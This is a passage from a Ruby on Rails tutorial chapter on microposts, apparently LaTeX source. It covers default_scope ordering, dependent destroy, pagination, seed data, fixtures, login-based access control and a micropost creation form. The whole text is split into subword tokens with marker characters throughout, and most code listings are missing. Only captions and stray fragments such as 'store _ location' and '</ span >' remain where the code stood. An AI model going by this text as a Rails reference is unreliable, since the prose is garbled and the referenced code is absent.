▁In ▁older ▁versions ▁of ▁Rails , ▁using ▁this ▁raw ▁SQL ▁used ▁to ▁be ▁the ▁only ▁option ▁to ▁get ▁the ▁desired ▁behavior , ▁but ▁as ▁of ▁Rails ~4.0 ▁we ▁can ▁use ▁a ▁more ▁natural ▁pure - Ruby ▁syntax ▁as ▁well :
▁ Adding ▁this ▁in ▁a ▁default ▁scope ▁for ▁the ▁Micropost ▁model ▁gives ▁Listing ~\ ref { code : micropost _ order ing }.
▁ Order ing ▁the ▁microposts ▁with ▁\ k ode { default \_ scope }.
▁Listing ~\ ref { code : micropost _ order ing } ▁introduce s ▁the ▁`` st a b by ▁ lambda '' ▁syntax ▁for ▁an ▁object ▁called ▁a ▁\ emph { Proc } ▁( procedure ) ▁or ▁\ emph { lambda }, ▁which ▁is ▁an ▁\ emph { anonymous ▁function } ▁( a ▁function ▁created ▁without ▁a ▁name ).
▁The ▁sta b by ▁ lambda ▁\ k ode { - > } ▁take s ▁in ▁a ▁block ▁( Section ~\ ref { sec : block s }) ▁and ▁returns ▁a ▁ Proc , ▁which ▁can ▁the n ▁be ▁evaluated ▁with ▁the ▁\ k ode { c all } ▁method .
▁We ▁can ▁see ▁how ▁it ▁works ▁at ▁the ▁console :
▁=> ▁#< Proc : 0 x 0 07 fa b 9 38 d 0 1 08 @ ( i rb ) : 1 ▁( lambda ) >
▁( This ▁is ▁a ▁some what ▁advanced ▁Ruby ▁topic , ▁so ▁don ' t ▁worry ▁if ▁it ▁does n ' t ▁make ▁sense ▁right ▁a way .)
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : micropost _ order ing }, ▁the ▁tests ▁should ▁be ▁\ passing :
▁De p end ent : ▁destroy
▁A part ▁from ▁proper ▁order ing , ▁there ▁is ▁a ▁second ▁refinement ▁we ' d ▁like ▁to ▁add ▁to ▁microposts .
▁Recall ▁from ▁Section ~\ ref { sec : deleting _ users } ▁that ▁site ▁administrator s ▁have ▁the ▁power ▁to ▁\ emph { destroy } ▁users .
▁It ▁stand s ▁to ▁reason ▁that , ▁if ▁a ▁user ▁is ▁destroyed , ▁the ▁user ' s ▁microposts ▁should ▁be ▁destroyed ▁as ▁well .
▁We ▁can ▁arrange ▁for ▁this ▁behavior ▁by ▁passing ▁an ▁option ▁to ▁the ▁\ k ode { has \_ many } ▁association ▁method , ▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ dependency }.
▁Ensur ing ▁that ▁a ▁user ' s ▁microposts ▁are ▁destroyed ▁along ▁with ▁the ▁user .
▁Here ▁the ▁option ▁\ k ode { dependent : ▁: destroy } ▁arrange s ▁for ▁the ▁ dependent ▁microposts ▁to ▁be ▁destroyed ▁when ▁the ▁user ▁itself ▁is ▁destroyed .
▁This ▁prevent s ▁user less ▁microposts ▁from ▁being ▁ str and ed ▁in ▁the ▁database ▁when ▁admin s ▁choose ▁to ▁remove ▁users ▁from ▁the ▁system .
▁We ▁can ▁verify ▁that ▁Listing ~\ ref { code : micropost _ dependency } ▁is ▁working ▁with ▁a ▁test ▁for ▁the ▁User ▁model .
▁All ▁we ▁need ▁to ▁do ▁is ▁save ▁the ▁user ▁( so ▁it ▁get s ▁an ▁id ) ▁and ▁create ▁an ▁ associated ▁micropost .
▁Then ▁we ▁check ▁that ▁destroying ▁the ▁user ▁reduce s ▁the ▁micropost ▁count ▁by ▁1.
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : dependent _ destroy _ test }
▁( Compar e ▁to ▁the ▁integration ▁test ▁for ▁`` delete '' ▁links ▁in ▁Listing ~\ ref { code : delete _ link _ integration _ test }. )
▁A ▁test ▁of ▁\ k ode { dependent : ▁: destroy }.
▁If ▁the ▁code ▁in ▁Listing ~\ ref { code : micropost _ dependency } ▁is ▁working ▁correctly , ▁the ▁test ▁suite ▁should ▁ still ▁be ▁\ passing :
▁A lthough ▁we ▁don ' t ▁yet ▁have ▁a ▁way ▁to ▁create ▁microposts ▁through ▁the ▁web --- that ▁comes ▁in ▁Section ~\ ref { sec : creating _ microposts }--- this ▁won ' t ▁stop ▁us ▁from ▁display ing ▁them ▁( and ▁testing ▁that ▁display ).
▁Follow ing ▁Twitter ' s ▁lead , ▁we ' ll ▁plan ▁to ▁display ▁a ▁user ' s ▁microposts ▁not ▁on ▁a ▁separate ▁microposts ▁\ k ode { index } ▁page ▁but ▁rather ▁directly ▁on ▁the ▁user ▁\ k ode { show } ▁page ▁itself , ▁as ▁mock ed ▁up ▁in ▁F igure ~\ ref { fig : user _ microposts _ mockup }.
▁We ' ll ▁start ▁with ▁fai r ly ▁simple ▁ERb ▁templates ▁for ▁adding ▁a ▁micropost ▁display ▁to ▁the ▁user ▁profile , ▁and ▁the n ▁we ' ll ▁add ▁microposts ▁to ▁the ▁see d ▁data ▁from ▁Section ~\ ref { sec : sample _ users } ▁so ▁that ▁we ▁have ▁something ▁to ▁display .
▁A ▁mockup ▁of ▁a ▁profile ▁page ▁with ▁microposts .
▁\ label { fig : user _ microposts _ mockup } }< n >\ end { figure }< n >< n > ▁\ subsection { Render ing ▁microposts } ▁% ▁( fold )< n > ▁\ label { sec : render ing _ microposts }< n >< n > O ur ▁plan ▁is ▁to ▁display ▁the
▁As ▁we ' ll ▁see , ▁many ▁of ▁the ▁idea s ▁are ▁similar ▁to ▁our ▁work ▁in ▁Section ~\ ref { sec : showing _ all _ users } ▁on ▁show ing ▁all ▁users .
▁A lthough ▁we ▁won ' t ▁need ▁the ▁Microposts ▁controller ▁un til ▁Section ~\ ref { sec : m anipulating _ microposts }, ▁we ▁will ▁need ▁the ▁views ▁directory ▁in ▁just ▁a ▁moment , ▁so ▁let ' s ▁generate ▁the ▁controller ▁now :
▁Ou r ▁primary ▁purpose ▁in ▁this ▁section ▁is ▁to ▁render ▁all ▁the ▁microposts ▁for ▁each ▁user .
▁We ▁saw ▁in ▁Section ~\ ref { sec : partial _ refactoring } ▁that ▁the ▁code
▁Note ▁that ▁we ' ve ▁used ▁the ▁\ emph { order ed ▁list } ▁tag ~\ k ode { ol } ▁( as ▁oppos ed ▁to ▁an ▁un order ed ▁list ~\ k ode { ul }) ▁because ▁microposts ▁are ▁list ed ▁in ▁a ▁particular ▁order ▁( reverse - ch r on o log ical ).
▁The ▁corresponding ▁partial ▁appears ▁in ▁Listing ~\ ref { code : micropost _ partial }.
▁A ▁partial ▁for ▁show ing ▁a ▁single ▁micropost .
▁</ span >
▁This ▁uses ▁the ▁a we some ▁\ k ode { time \_ ago \_ in \_ words } ▁helper ▁method , ▁who se ▁meaning ▁is ▁ probably ▁clear ▁and ▁who se ▁effect ▁we ▁will ▁see ▁in ▁Section ~\ ref { sec : sample _ microposts }.
▁Listing ~\ ref { code : micropost _ partial } ▁also ▁add s ▁a ▁CSS ~ id ▁for ▁each ▁micropost ▁using
▁This ▁is ▁a ▁generally ▁good ▁practice , ▁as ▁it ▁open s ▁up ▁the ▁possibility ▁of ▁m anipulating ▁individual ▁microposts ▁at ▁a ▁future ▁date ▁( using ▁JavaScript , ▁for ▁example ).
▁The ▁next ▁step ▁is ▁to ▁address ▁the ▁difficult y ▁of ▁display ing ▁a ▁ potentially ▁large ▁number ▁of ▁microposts .
▁We ' ll ▁solve ▁this ▁problem ▁the ▁same ▁way ▁we ▁solve d ▁it ▁for ▁users ▁in ▁Section ~\ ref { sec : pagination }, ▁name ly , ▁using ▁pagination .
▁As ▁before , ▁we ' ll ▁use ▁the ▁\ k ode { will \_ paginate } ▁method :
▁If ▁you ▁compare ▁this ▁with ▁the ▁analogous ▁line ▁on ▁the ▁user ▁index ▁page , ▁Listing ~\ ref { code : will _ paginate _ index _ view }, ▁you ' ll ▁see ▁that ▁before ▁we ▁ha d ▁just
▁This ▁work ed ▁because , ▁in ▁the ▁context ▁of ▁the ▁Users ▁controller , ▁\ k ode { will \_ paginate } ▁\ emph { as sum es } ▁the ▁exist ence ▁of ▁an ▁instance ▁variable ▁called ▁\ k ode {@ users } ▁( which , ▁as ▁we ▁saw ▁in ▁Section ~\ ref { sec : pagination }, ▁should ▁be ▁of ▁class ▁\ k ode { ActiveRecord :: Relation }).
▁Of ▁course , ▁this ▁means ▁that ▁we ▁will ▁have ▁to ▁define ▁such ▁a ▁variable ▁in ▁the ▁user ▁\ k ode { show } ▁action ▁( Listing ~\ ref { code : user _ show _ microposts _ instance }).
▁ Adding ▁an ▁\ k ode {@ microposts } ▁instance ▁variable ▁to ▁the ▁user ▁\ k ode { show } ▁action .
▁Noti ce ▁here ▁how ▁cl ever ▁\ k ode { paginate } ▁is --- it ▁even ▁works ▁\ emph { through } ▁the ▁microposts ▁association , ▁reach ing ▁into ▁the ▁\ text tt { microposts } ▁table ▁and ▁pull ing ▁out ▁the ▁desired ▁page ▁of ▁microposts .
▁Ou r ▁final ▁task ▁is ▁to ▁display ▁the ▁number ▁of ▁microposts ▁for ▁each ▁user , ▁which ▁we ▁can ▁do ▁with ▁the ▁\ k ode { count } ▁method :
▁As ▁with ▁\ k ode { paginate }, ▁we ▁can ▁use ▁the ▁\ k ode { count } ▁method ▁through ▁the ▁association .
▁In ▁particular , ▁\ k ode { count } ▁does ▁\ emph { not } ▁pull ▁all ▁the ▁microposts ▁out ▁of ▁the ▁database ▁and ▁the n ▁call ▁\ k ode { length } ▁on ▁the ▁result ing ▁array , ▁as ▁this ▁would ▁become ▁in efficient ▁as ▁the ▁number ▁of ▁microposts ▁g re w .
▁Instead , ▁it ▁perform s ▁the ▁calculat ion ▁directly ▁in ▁the ▁database , ▁as k ing ▁the ▁database ▁to ▁count ▁the ▁microposts ▁with ▁the ▁given ▁\ k ode { user \_ id } ▁( an ▁operation ▁for ▁which ▁all ▁database s ▁are ▁high ly ▁optimized ).
▁( In ▁the ▁unlike ly ▁even t ▁that ▁find ing ▁the ▁count ▁is ▁ still ▁a ▁bot t le n ec k ▁in ▁your ▁application , ▁you ▁can ▁make ▁it ▁even ▁faster ▁using ▁a ▁\ href { http :// r ailscasts . com / episodes / 23 - counter - cache - column }{\ emph { counter ▁cache } }. )
▁P utting ▁all ▁the ▁elements ▁above ▁together , ▁we ▁are ▁now ▁in ▁a ▁position ▁to ▁add ▁microposts ▁to ▁the ▁profile ▁page , ▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ show _ microposts }.
▁Note ▁the ▁use ▁of ▁\ k ode { if ▁@ user . microposts . any ?}\ ▁( a ▁construction ▁we ▁saw ▁before ▁in ▁Listing ~\ ref { code : errors _ partial }), ▁which ▁make s ▁sure ▁that ▁an ▁empty ▁list ▁won ' t ▁be ▁displayed ▁when ▁the ▁user ▁has ▁no ▁microposts .
▁ Adding ▁microposts ▁to ▁the ▁user ▁\ k ode { show } ▁page .
▁At ▁this ▁point , ▁we ▁can ▁get ▁a ▁look ▁at ▁our ▁updated ▁user ▁profile ▁page ▁in ▁F igure ~\ ref { fig : user _ profile _ no _ microposts }.
▁Of ▁course , ▁this ▁is ▁because ▁there ▁are ▁not ▁current ly ▁any ▁microposts .
▁It ' s ▁time ▁to ▁change ▁that .
▁The ▁user ▁profile ▁page ▁with ▁code ▁for ▁microposts --- but ▁no ▁microposts .
▁With ▁all ▁the ▁work ▁making ▁templates ▁for ▁user ▁microposts ▁in ▁Section ~\ ref { sec : render ing _ microposts }, ▁the ▁end ing ▁was ▁rather ▁an tic li m ac tic .
▁We ▁can ▁re c t ify ▁this ▁ s ad ▁situation ▁by ▁adding ▁microposts ▁to ▁the ▁see d ▁data ▁from ▁Section ~\ ref { sec : sample _ users }.
▁ Adding ▁sample ▁microposts ▁for ▁\ emph { all } ▁the ▁users ▁actually ▁take s ▁a ▁rather ▁long ▁time , ▁so ▁first ▁we ' ll ▁select ▁just ▁the ▁first ▁ s i x ▁users ▁( i . e . , ▁the ▁f ive ▁users ▁with ▁custom ▁Gravatar s , ▁and ▁one ▁with ▁the ▁default ▁Gravatar ) ▁using ▁the ▁\ k ode { take } ▁method :
▁T a il ▁your ▁\ k ode { log / development . log } ▁file ▁if ▁you ' re ▁curious ▁about ▁the ▁SQL ▁this ▁method ▁generates .
▁The ▁call ▁to ▁\ k ode { order } ▁ensure s ▁that ▁we ▁find ▁the ▁first ▁ s i x ▁users ▁that ▁were ▁created .
▁For ▁each ▁of ▁the ▁select ed ▁users , ▁we ' ll ▁make ▁50 ▁microposts ▁( p l ent y ▁to ▁ overflow ▁the ▁pagination ▁limit ▁of ~3 0 ).
▁in ▁Listing ~\ ref { code : sample _ microposts }.
▁( The ▁reason ▁for ▁the ▁order ▁of ▁the ▁loop s ▁in ▁Listing ~\ ref { code : sample _ microposts } ▁is ▁to ▁in ter m i x ▁the ▁microposts ▁for ▁use ▁in ▁the ▁status ▁feed ▁( Section ~\ ref { sec : the _ status _ feed }).
▁L oo p ing ▁over ▁the ▁users ▁first ▁gives ▁feed s ▁with ▁big ▁run s ▁of ▁microposts ▁from ▁the ▁same ▁user , ▁which ▁is ▁ visual ly ▁un app e al ing .)
▁ Adding ▁microposts ▁to ▁the ▁sample ▁data .
▁At ▁this ▁point , ▁we ▁can ▁re seed ▁the ▁development ▁database ▁as ▁usual :
▁You ▁should ▁also ▁ quit ▁and ▁restart ▁the ▁Rails ▁development ▁server .
▁By ▁design , ▁the ▁ Faker ▁gem ' s ▁\ emph { lo re m ▁ ip sum } ▁text ▁is ▁random ize d , ▁so ▁the ▁contents ▁of ▁your ▁sample ▁microposts ▁will ▁differ .
▁The ▁user ▁profile ▁with ▁un style d ▁microposts .
▁The ▁page ▁show n ▁in ▁F igure ~\ ref { fig : user _ profile _ microposts _ no _ st y l ing } ▁has ▁no ▁micropost - specific ▁styling , ▁so ▁let ' s ▁add ▁some ▁( Listing ~\ ref { code : micropost _ css }) ▁and ▁take ▁a ▁look ▁at ▁the ▁result ing ▁pages
▁For ▁convenience , ▁Listing ~\ ref { code : micropost _ css } ▁actually ▁has ▁\ emph { all } ▁the ▁CSS ▁needed ▁for ▁this ▁chapter .
▁The ▁CSS ▁for ▁microposts ▁( including ▁all ▁the ▁CSS ▁for ▁this ▁chapter ).
▁F igure ~\ ref { fig : user _ profile _ with _ microposts } ▁shows ▁the ▁user ▁profile ▁page ▁for ▁the ▁first ▁user , ▁while ▁F igure ~\ ref { fig : other _ profile _ with _ microposts } ▁shows ▁the ▁profile ▁for ▁a ▁second ▁user .
▁F inally , ▁F igure ~\ ref { fig : user _ profile _ microposts } ▁shows ▁the ▁\ emph { second } ▁page ▁of ▁microposts ▁for ▁the ▁first ▁user , ▁along ▁with ▁the ▁pagination ▁links ▁at ▁the ▁bottom ▁of ▁the ▁display .
▁In ▁all ▁three ▁cases , ▁ ob serve ▁that ▁each ▁micropost ▁display ▁indicates ▁the ▁time ▁since ▁it ▁was ▁created ▁( e . g . , ▁`` Post ed ▁1 ▁ minute ▁ ago . '') ; ▁this ▁is ▁the ▁work ▁of ▁the ▁\ k ode { time \_ ago \_ in \_ words } ▁method ▁from ▁Listing ~\ ref { code : micropost _ partial }.
▁If ▁you ▁wait ▁a ▁couple ▁of ▁minutes ▁and ▁reload ▁the ▁pages , ▁you ' ll ▁see ▁how ▁the ▁text ▁get s ▁automatically ▁updated ▁base d ▁on ▁the ▁new ▁time .
▁The ▁user ▁profile ▁with ▁microposts ▁(\ href { http :// localhost :3000/ users /1}{ / users /1 }).
▁The ▁profile ▁of ▁a ▁different ▁user , ▁also ▁with ▁microposts ▁(\ href { http :// localhost :3000/ users / 5 }{/ users / 5 }).
▁Because ▁new ly ▁ activated ▁users ▁get ▁redirect ed ▁to ▁their ▁profile ▁pages , ▁we ▁already ▁have ▁a ▁test ▁that ▁the ▁profile ▁page ▁render s ▁correctly ▁( Listing ~\ ref { code : signup _ with _ account _ activation _ test }).
▁In ▁this ▁section , ▁we ' ll ▁write ▁a ▁short ▁integration ▁test ▁for ▁some ▁of ▁the ▁other ▁elements ▁on ▁the ▁profile ▁page , ▁including ▁the ▁work ▁from ▁this ▁section .
▁We ' ll ▁start ▁by ▁ generating ▁an ▁integration ▁test ▁for ▁the ▁profile s ▁of ▁our ▁site ' s ▁users :
▁To ▁test ▁the ▁micropost ▁display ▁on ▁the ▁profile , ▁we ▁need ▁to ▁associate ▁the ▁fixture ▁microposts ▁with ▁a ▁user .
▁Rails ▁includes ▁a ▁convenient ▁way ▁to ▁build ▁associations ▁in ▁fixtures , ▁like ▁this :
▁By ▁identify ing ▁the ▁\ k ode { user } ▁as ▁\ k ode { michael }, ▁we ▁tell ▁Rails ▁to ▁associate ▁this ▁micropost ▁with ▁the ▁corresponding ▁user ▁in ▁the ▁users ▁fixture :
▁To ▁test ▁micropost ▁pagination , ▁we ' ll ▁also ▁generate ▁some ▁ additional ▁micropost ▁fixtures ▁using ▁the ▁same ▁ embedded ▁Ruby ▁technique ▁we ▁used ▁to ▁make ▁ additional ▁users ▁in ▁Listing ~\ ref { code : users _ fixtures _ ext ra _ users } :
▁P utting ▁all ▁this ▁together ▁gives ▁the ▁updated ▁micropost ▁fixtures ▁in ▁Listing ~\ ref { code : updated _ micropost _ fixtures }.
▁Micropost ▁fixtures ▁with ▁user ▁associations .
▁With ▁the ▁test ▁data ▁thus ▁prepared , ▁the ▁test ▁itself ▁is ▁fai r ly ▁straightforward : ▁we ▁visit ▁the ▁user ▁profile ▁page ▁and ▁check ▁for ▁the ▁page ▁title ▁and ▁the ▁user ' s ▁name , ▁Gravatar , ▁micropost ▁count , ▁and ▁ paginate d ▁microposts .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : user _ profile _ test }
▁Note ▁the ▁use ▁of ▁the ▁\ k ode { full \_ title } ▁helper ▁from ▁Listing ~\ ref { code : title _ helper } ▁to ▁test ▁the ▁page ' s ▁title , ▁which ▁we ▁gain ▁access ▁to ▁by ▁including ▁the ▁Application ▁ Helper ▁module ▁into ▁the ▁test
▁If ▁you ' d ▁like ▁to ▁refactor ▁other ▁tests ▁to ▁use ▁\ k ode { full \_ title } ▁( such ▁as ▁those ▁in ▁Listing ~\ ref { code : base _ title _ test }), ▁you ▁should ▁include ▁the ▁Application ▁ Helper ▁in ▁\ k ode { test \_ helper . rb } ▁instead .
▁A ▁test ▁for ▁the ▁user ▁profile .
▁The ▁micropost ▁count ▁assertion ▁in ▁Listing ~\ ref { code : user _ profile _ test } ▁uses ▁\ k ode { response . body }, ▁which ▁we ▁saw ▁brief ly ▁in ▁the ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ reset } ▁ exercises ▁( Section ~\ ref { sec : activation _ resets _ exercises }).
▁De s p ite ▁its ▁name , ▁\ k ode { response . body } ▁contains ▁the ▁full ▁HTML ▁source ▁of ▁the ▁page ▁( and ▁not ▁just ▁the ▁page ' s ▁body ).
▁This ▁means ▁that ▁if ▁all ▁we ▁care ▁about ▁is ▁that ▁the ▁number ▁of ▁microposts ▁appears ▁\ emph { some where } ▁on ▁the ▁page , ▁we ▁can ▁look ▁for ▁a ▁match ▁as ▁follows :
▁This ▁is ▁a ▁much ▁less ▁specific ▁assertion ▁than ▁\ k ode { assert \_ select } ; ▁in ▁particular , ▁unlike ▁\ k ode { assert \_ select }, ▁using ▁\ k ode { assert \_ match } ▁in ▁this ▁context ▁does n ' t ▁require ▁us ▁to ▁indicate ▁which ▁HTML ▁tag ▁we ' re ▁look ing ▁for .
▁This ▁check s ▁for ▁an ▁\ k ode { img } ▁tag ▁with ▁class ▁\ k ode { gravatar } ▁\ emph { in side } ▁a ▁to p - level ▁ head ing ▁tag ▁(\ k ode { h 1 }).
▁Because ▁the ▁application ▁code ▁was ▁working , ▁the ▁test ▁suite ▁should ▁be ▁\ passing :
▁Having ▁finished ▁both ▁the ▁data ▁model ing ▁and ▁display ▁templates ▁for ▁microposts , ▁we ▁now ▁turn ▁our ▁a tt ent ion ▁to ▁the ▁interface ▁for ▁creating ▁them ▁through ▁the ▁web .
▁In ▁this ▁section , ▁we ' ll ▁also ▁see ▁the ▁first ▁hint ▁of ▁a ▁\ emph { status ▁feed }--- a ▁not ion ▁ br ough t ▁to ▁full ▁f ru it ion ▁in ▁Chapter ~\ ref { cha : following _ users }.
▁F inally , ▁as ▁with ▁users , ▁we ' ll ▁make ▁it ▁possible ▁to ▁destroy ▁microposts ▁through ▁the ▁web .
▁There ▁is ▁one ▁break ▁with ▁ past ▁convention ▁worth ▁noting : ▁the ▁interface ▁to ▁the ▁Microposts ▁resource ▁will ▁run ▁principal ly ▁through ▁the ▁ Pro file ▁and ▁Home ▁pages , ▁so ▁we ▁won ' t ▁need ▁actions ▁like ▁\ k ode { new } ▁or ▁\ k ode { edit } ▁in ▁the ▁Microposts ▁controller ; ▁we ' ll ▁need ▁only ▁\ k ode { create } ▁and ▁\ k ode { destroy }.
▁This ▁lead s ▁to ▁the ▁routes ▁for ▁the ▁Microposts ▁resource ▁show n ▁in ▁Listing ~\ ref { code : microposts _ resource }.
▁The ▁code ▁in ▁Listing ~\ ref { code : microposts _ resource } ▁lead s ▁in ▁turn ▁to ▁the ▁RESTful ▁routes ▁show n ▁in ▁Table ~\ ref { table : RESTful _ microposts }, ▁which ▁is ▁a ▁small ▁sub set ▁of ▁the ▁full ▁set ▁of ▁routes ▁seen ▁in ▁Table ~\ ref { table : demo _ RESTful _ microposts }.
▁Of ▁course , ▁this ▁simplicity ▁is ▁a ▁sign ▁of ▁being ▁\ emph { more } ▁advanced , ▁not ▁less --- we ' ve ▁come ▁a ▁long ▁way ▁since ▁our ▁re li ance ▁on ▁scaffolding ▁in ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁and ▁we ▁no ▁longer ▁need ▁most ▁of ▁its ▁complex ity .
▁Routes ▁for ▁the ▁Microposts ▁resource .
▁RESTful ▁routes ▁provided ▁by ▁the ▁Microposts ▁resource ▁in ▁Listing ~\ ref { code : microposts _ resource }.
▁\ label { table : RESTful _ microposts } }< n >\ end { table }< n >< n > ▁\ subsection { Micropost ▁access ▁control } ▁% ▁( fold )< n > ▁\ label { sec : micropost _ access _ control }< n >< n >
▁We ▁begin ▁our ▁development ▁of ▁the ▁Microposts ▁resource ▁with ▁some ▁access ▁control ▁in ▁the ▁Microposts ▁controller .
▁In ▁particular , ▁because ▁we ▁access ▁microposts ▁through ▁their ▁ associated ▁users , ▁both ▁the ▁\ k ode { create } ▁and ▁\ k ode { destroy } ▁actions ▁must ▁require ▁users ▁to ▁be ▁logged ▁in .
▁Tests ▁to ▁enforce ▁logged - in ▁status ▁m ir r or ▁those ▁for ▁the ▁Users ▁controller ▁( Listing ~\ ref { code : edit _ update _ redirect _ tests } ▁and ▁Listing ~\ ref { code : action _ tests _ admin }).
▁We ▁simply ▁issue ▁the ▁correct ▁request ▁to ▁each ▁action ▁and ▁confirm ▁that ▁the ▁micropost ▁count ▁is ▁un change d ▁and ▁the ▁result ▁is ▁redirect ed ▁to ▁the ▁login ▁URL , ▁as ▁seen ▁in ▁Listing ~\ ref { code : create _ destroy _ micropost _ tests }.
▁ Auth or i z ation ▁tests ▁for ▁the ▁Microposts ▁controller .
▁Writ ing ▁the ▁application ▁code ▁needed ▁to ▁get ▁the ▁tests ▁in ▁Listing ~\ ref { code : create _ destroy _ micropost _ tests } ▁to ▁pass ▁requires ▁a ▁little ▁refactoring ▁first .
▁Recall ▁from ▁Section ~\ ref { sec : requiring _ logged _ in _ users } ▁that ▁we ▁enforce d ▁the ▁login ▁requirement ▁using ▁a ▁before ▁filter ▁that ▁called ▁the ▁\ k ode { logged \_ in \_ user } ▁method ▁( Listing ~\ ref { code : authorize _ before _ filter }).
▁At ▁the ▁time , ▁we ▁needed ▁that ▁method ▁only ▁in ▁the ▁Users ▁controller , ▁but ▁now ▁we ▁find ▁that ▁we ▁need ▁it ▁in ▁the ▁Microposts ▁controller ▁as ▁well , ▁so ▁we ' ll ▁move ▁it ▁into ▁the ▁Application ▁controller , ▁which ▁is ▁the ▁base ▁class ▁of ▁all ▁controllers ▁( Section ~\ ref { sec : a _ controller _ class }).
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : sessions _ helper _ authenticate }
▁Mo v ing ▁the ▁\ k ode { logged \_ in \_ user } ▁method ▁into ▁the ▁Application ▁controller .
▁store _ location
▁To ▁avoid ▁code ▁repetition , ▁you ▁should ▁also ▁remove ▁\ k ode { logged \_ in \_ user } ▁from ▁the ▁Users ▁controller ▁at ▁this ▁time .
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : sessions _ helper _ authenticate }, ▁the ▁\ k ode { logged \_ in \_ user } ▁method ▁is ▁now ▁available ▁in ▁the ▁Microposts ▁controller , ▁which ▁means ▁that ▁we ▁can ▁add ▁\ k ode { create } ▁and ▁\ k ode { destroy } ▁actions ▁and ▁the n ▁restrict ▁access ▁to ▁them ▁using ▁a ▁before ▁filter , ▁as ▁show n ▁in ▁Listing ~\ ref { code : microposts _ controller _ access _ control }.
▁ Adding ▁authorization ▁to ▁the ▁Microposts ▁controller ▁actions .
▁At ▁this ▁point , ▁the ▁tests ▁should ▁pass :
▁In ▁Chapter ~\ ref { cha : sign _ up }, ▁we ▁implemented ▁user ▁signup ▁by ▁making ▁an ▁HTML ▁form ▁that ▁issue d ▁an ▁HTTP ▁\ text tt { POST } ▁request ▁to ▁the ▁\ k ode { create } ▁action ▁in ▁the ▁Users ▁controller .
▁The ▁implementation ▁of ▁micropost ▁creation ▁is ▁similar ; ▁the ▁main ▁difference ▁is ▁that , ▁rather ▁than ▁using ▁a ▁separate ▁page ▁at ▁/ microposts / new , ▁we ▁will ▁put ▁the ▁form ▁on ▁the ▁Home ▁page ▁itself ▁( i . e . , ▁the ▁root ▁path ~ / ), ▁as ▁mock ed ▁up ▁in ▁F igure ~\ ref { fig : home _ page _ with _ micropost _ form _ mockup }.
▁A ▁mockup ▁of ▁the ▁Home ▁page ▁with ▁a ▁form ▁for ▁creating ▁microposts .
▁When ▁we ▁last ▁left ▁the ▁Home ▁page , ▁it ▁appear ed ▁as ▁in ▁F igure ~\ ref { fig : sample _ app _ logo }--- that ▁is , ▁it ▁ha d ▁a ▁`` Sign ▁up ▁now ! '' ▁button ▁in ▁the ▁m id d le .
▁S ince ▁a ▁micropost ▁creation ▁form ▁make s ▁sense ▁only ▁in ▁the ▁context ▁of ▁a ▁particular ▁logged - in ▁user , ▁one ▁goal ▁of ▁this ▁section ▁will ▁be ▁to ▁serve ▁different ▁versions ▁of ▁the ▁Home ▁page ▁depending ▁on ▁a ▁visit or ' s ▁login ▁status .
▁We ' ll ▁implement ▁this ▁in ▁Listing ~\ ref { code : microposts _ home _ page } ▁below .
▁as ▁seen ▁in ▁Listing ~\ ref { code : microposts _ create _ action }.
▁Note ▁the ▁use ▁of ▁ strong ▁parameters ▁via ▁\ k ode { micropost \_ params }, ▁which ▁ permit s ▁only ▁the ▁micropost ' s ▁\ k ode { content } ▁attribute ▁to ▁be ▁modified ▁through ▁the ▁web .
▁The ▁Microposts ▁controller ▁\ k ode { create } ▁action .
▁To ▁build ▁a ▁form ▁for ▁creating ▁microposts , ▁we ▁use ▁the ▁code ▁in ▁Listing ~\ ref { code : microposts _ home _ page }, ▁which ▁serve s ▁up ▁different ▁HTML ▁base d ▁on ▁whether ▁the ▁site ▁visit or ▁is ▁logged ▁in ▁or ▁not .
▁ Adding ▁microposts ▁creation ▁to ▁the ▁Home ▁page ▁(\ href { http :// localhost :3000/ }{/ }).
▁( H a v ing ▁so ▁much ▁code ▁in ▁each ▁branch ▁of ▁the ▁\ k ode { if } - \ k ode { else } ▁condition al ▁is ▁a ▁bit ▁me s s y , ▁and ▁clean ing ▁it ▁up ▁using ▁partials ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : micropost _ exercises }).)
▁To ▁get ▁the ▁page ▁defined ▁in ▁Listing ~\ ref { code : microposts _ home _ page } ▁working , ▁we ▁need ▁to ▁create ▁and ▁fill ▁in ▁a ▁couple ▁of ▁partials .
▁The ▁first ▁is ▁the ▁new ▁Home ▁page ▁sidebar , ▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ info }.
▁The ▁partial ▁for ▁the ▁user ▁ info ▁sidebar .
▁Note ▁that , ▁as ▁in ▁the ▁profile ▁sidebar ▁( Listing ~\ ref { code : user _ show _ microposts }), ▁the ▁user ▁ info ▁in ▁Listing ~\ ref { code : user _ info } ▁display s ▁the ▁total ▁number ▁of ▁microposts ▁for ▁the ▁user .
▁There ' s ▁a ▁ s l ight ▁difference ▁in ▁the ▁display , ▁though ; ▁in ▁the ▁profile ▁sidebar , ▁`` Micropost s '' ▁is ▁a ▁ label , ▁and ▁show ing ▁`` Micropost s ▁ (1) '' ▁make s ▁sense .
▁In ▁the ▁present ▁case , ▁though , ▁say ing ▁`` 1 ▁microposts '' ▁is ▁ungrammatical , ▁so ▁we ▁arrange ▁to ▁display ▁`` 1 ▁micropost '' ▁and ▁`` 2 ▁microposts '' ▁using ▁the ▁\ k ode { pluralize } ▁method ▁we ▁saw ▁in ▁Section ~\ ref { sec : signup _ error _ messages }.
▁We ▁next ▁define ▁the ▁form ▁for ▁creating ▁microposts ▁( Listing ~\ ref { code : micropost _ form }), ▁which ▁is ▁similar ▁to ▁the ▁signup ▁form ▁in ▁Listing ~\ ref { code : signup _ form }.
▁The ▁form ▁partial ▁for ▁creating ▁microposts .
▁We ▁need ▁to ▁make ▁two ▁changes ▁before ▁the ▁form ▁in ▁Listing ~\ ref { code : micropost _ form } ▁will ▁work .
▁First , ▁we ▁need ▁to ▁define ▁\ k ode {@ micropost }, ▁which ▁( as ▁before ) ▁we ▁do ▁through ▁the ▁association :
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : micropost _ instance _ variable }
▁ Adding ▁a ▁micropost ▁instance ▁variable ▁to ▁the ▁\ k ode { home } ▁action .
